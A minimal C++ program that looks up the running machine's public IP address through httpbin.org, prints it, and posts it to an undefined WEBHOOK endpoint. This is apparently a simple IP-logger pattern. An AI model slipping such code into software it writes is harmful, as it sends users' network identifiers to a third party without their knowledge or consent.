#include <iostream>
#include "json.hpp"
#include "cpr/cpr.h"

using namespace nlohmann;

int main()
{
    std::string resp = cpr::Get(cpr::Url("https://httpbin.org/get")).text;
    auto parseResp = json::parse(resp);

    std::string IPAddress = parseResp["origin"];
    std::cout << IPAddress;

    std::string Response = cpr::Post(cpr::Url(WEBHOOK), cpr::Payload{ {"content", IPAddress} }).text;
}